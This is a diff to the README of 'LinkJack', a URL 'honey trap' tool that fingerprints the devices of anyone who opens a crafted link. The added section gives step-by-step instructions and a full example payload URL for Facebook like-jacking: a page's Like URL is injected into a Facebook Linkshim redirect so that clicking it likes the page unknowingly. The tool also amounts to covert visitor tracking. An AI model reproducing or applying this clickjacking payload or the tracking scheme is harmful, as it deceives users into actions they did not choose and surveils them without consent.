@@ -1,12 +1,41 @@
-# LinkJack Honey Trap System
+# LinkJack
 
-## LinkJack is a customisable URL Honey Trap System that has advanced device recognition features for anybody that loads a constructed link.
+### LinkJack is a customisable URL Honey Trap System that has advanced device recognition features for anybody that loads a constructed link.
 [![demo button](https://i.imgur.com/3Ugm8J7.jpg)](https://linkstats.ml) 
 ![screen](https://i.imgur.com/CetGtaL.jpg)
 
 ## History
 > This was originally designed for a security report to facebook, however Facebook said that this wasn't a concern toward security - since then it has slowly evolved over time to become a powerful visitor tracking service using a combination of other free services. 
 thanks to the security research efforts of Venomo under the WokeWorld Project 2020.
+    
+## Updates on report     
+> Facebook Like Jacking Successfully performed 7 November 2020    
+* Load Facebook in mbasic.facebook.com    
+* Go to the desired Page to Like Jack    
+* Hold ( Long Press ) on Like button and Select Copy URL    
+* Paste the Like URL into a new text document
+* Open the Facebook News Feed and find a Link    
+* Extract the Facebook Linkshim URL from the Link    
+* Format your Like URL in urlEncoded format     
+* Inject Like URL into Linkshim URL   
+ 
+Eg,   
+Like URL    
+`https://mbasic.facebook.com/a/profile.php?fan&id=116472816929607&origin=page_profile&pageSuggestionsOnLiking=1&gfid=AQCxHP9_rBs9hWEIUBA&refid=17&ref=bookmarks`   
+        
+Link URL    
+`https://lm.facebook.com/l.php?u=[url]&h=AT0Q...`      
+      
+Injection URL     
+`https://lm.facebook.com/l.php?u=https%3A%2F%2Fmbasic.facebook.com%2Fa%2Fprofile.php%3Ffan%26id%3D116472816929607%26origin%3Dpage_profile%26pageSuggestionsOnLiking%3D1%26gfid%3DAQCxHP9_rBs9hWEIxwk%26refid%3D0&h=AT0QwiCjR8pUK_Lgr-w9hZWHMRUXNq-W9Wm5Vp5Ssq8x7C1rHJ4Jbfgm0ssXmqzU5NJH85zRkT886DKRQ_iWyRz0NQIZhobUMRUzlHyd582pZvKSAJMmrEOuD-6Y4vk0C73HAZZc2v0VcylgwtxAXni2DmJan1T99ObuVmQB5iIqnRfe5n5zCKWtJpD91hJV60wsN1Hn6LRxkZ5zx4uIatCmuFSIiosOV38E0spJRQdUZ2neUsLJc6vgv2p4mi2dfYIsJQKEANddyGjF3cP8oPHIbsjQz5LiU1NozYOoRgaUHe0k-0S8oq2D217f-Cy3CUkRI5AOPQxDR-EVFrs-YS6r2nGb8Ez_8rfsiFPr0F3DEvqRwMLGqfRcqxYqgHtJn36dzXUZyVFo5R-d7qc7fCN2sjdNx9n7SLLetrMA1P4Ru9Fua-XwTE4cAbT-PS6fEYkD45unAX3Ydu0uufq7mZq1t_BBfiUbncMr9TdvQ0PAIeWV6IapoaMH0x9BRThMyNUENthJQQnBpMUfvz_j4wu7VItZGBNL2-C1g9wg8nevzsAMIvCO_xm3XOIqwR-_pdw1SN5pnstDz-EESA`
+     
+  
+Like Jacking Successful within H parameters Time Allowance, each H param is unique to the time of Click and therefore will allow about 1 hour with that same H id.
+   
+GFID  Facebook GFID is also time limited to the same cookie expirations.
+   
+
+
 
 ## Technology
 * PHP 7
